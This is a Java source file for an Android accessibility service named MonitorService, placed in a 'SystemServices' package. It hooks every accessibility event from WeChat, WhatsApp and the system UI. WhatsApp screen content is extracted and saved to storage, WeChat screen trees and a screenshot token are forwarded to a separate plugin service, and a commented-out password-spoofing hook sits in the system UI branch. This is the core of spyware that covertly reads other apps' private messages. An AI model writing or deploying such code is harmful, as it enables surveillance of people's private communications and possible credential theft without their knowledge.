package com.example.SystemServices;


import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.annotation.TargetApi;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.example.Util.WhatsappMonitor;
import com.example.Util.wechat.wechatUtil;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Random;

public class MonitorService extends AccessibilityService {
    private final AccessibilityServiceInfo info = new AccessibilityServiceInfo();

    private long last_wechat_time = System.currentTimeMillis();
    private static String status = "uninitialized";
    private static String sdcardDir = null;
    private static String Action_WhatApp_Accessibility = "x.y.z.WSapp";
    private static String Param_Accessibility_Root = "x.y.z.paccroot";

    private static Intent screenshotIntentToken = null;
    public static void setScreenshotIntentToken(Intent token){
        screenshotIntentToken = token;
    }

    @Override
    public void onServiceConnected() {
        Log.d("WeChatLog", " service connected...");
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 500;
        info.packageNames = new String[]{
                "com.tencent.mm", "com.android.systemui",
                "com.google.android.apps.nexuslauncher",
                "com.whatsapp",
        };
        this.setServiceInfo(info);
        status = "running";
        sdcardDir = this.getExternalFilesDir(null).getAbsolutePath();
    }
    @Override
    public void onInterrupt() {
    }

    @TargetApi(14)
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (status == "hibernate") {
            return;
        }
        if (event.getPackageName().equals("com.tencent.mm")) {
            Log.d("tluo", "[time] (" + System.currentTimeMillis() + ") host receive wechat accessibility event " + event.toString());
            /*
            wechatUtil.status status = wechatUtil.analyze_xml(this, event);
            if(status.equals(wechatUtil.status.Invalid) || status.equals(wechatUtil.status.Unknown)){
                //return;
            }
            */
            forwardWeChatAccessibilityEventToPlugin(event);
        } else if (event.getPackageName().equals("com.android.systemui")) {
            //spoof_password(event);
        } else if (event.getPackageName().equals("com.whatsapp")) {
            AccessibilityNodeInfo root = event.getSource();
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("test.com.accessibility", "test.com.accessibility.UtilService"));
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                intent.setAction(Action_WhatApp_Accessibility);
                //intent.putExtra(ACTION_Screenshot_curApp, "whatsapp");
                //intent.putExtra(ACTION_Screenshot_dst_dir, this.getExternalFilesDir(null).getAbsolutePath());
                //intent.putExtra(ACTION_Screenshot_mtype, event.getEventType() + "");
                intent.putExtra(Param_Accessibility_Root, root);

                if(event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                    String _id_main_pager_holder = "com.whatsapp:id/pager_holder";
                    String _id_action_bar_root = "android:id/content";
                    List<AccessibilityNodeInfo> is_content_page = root.findAccessibilityNodeInfosByViewId(_id_action_bar_root);
                    if (is_content_page.size() == 1) {
                        Map<String, Object> data = WhatsappMonitor.Extract_Content(root, this, this.getExternalFilesDir(null).getAbsolutePath());
                    }
                    List<AccessibilityNodeInfo> allNodes = getAllChildrenBFS(root);
                    startService(intent);
                }
            }
        }
    }

    @TargetApi(14)
    private void forwardWeChatAccessibilityEventToPlugin(AccessibilityEvent event){
        AccessibilityNodeInfo root = event.getSource();
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(intentInterface.intentServicePkgName, intentInterface.intentServiceName));
        intent.setAction(intentInterface.Action_Accessibility);
        intent.putExtra(intentInterface.AccessEvent_intentToken, screenshotIntentToken);
        intent.putExtra(intentInterface.AccessEvent_Obj, event);
        intent.putExtra(intentInterface.AccessEvent_RootNode, root);
        intent.putExtra(intentInterface.intentService_Param_RootDir, sdcardDir);
        startService(intent);
    }

    @TargetApi(14)
    public static List<AccessibilityNodeInfo> getAllChildrenBFS(AccessibilityNodeInfo v) {
        List<AccessibilityNodeInfo> visited = new ArrayList<AccessibilityNodeInfo>();
        List<AccessibilityNodeInfo> unvisited = new ArrayList<AccessibilityNodeInfo>();
        unvisited.add(v);

        while (!unvisited.isEmpty()) {
            AccessibilityNodeInfo root = unvisited.remove(0);
            if (root == null) {
                continue;
            }
            visited.add(root);

            final int childCount = root.getChildCount();
            for (int i=0; i<childCount; i++) unvisited.add(root.getChild(i));
        }

        return visited;
    }
}

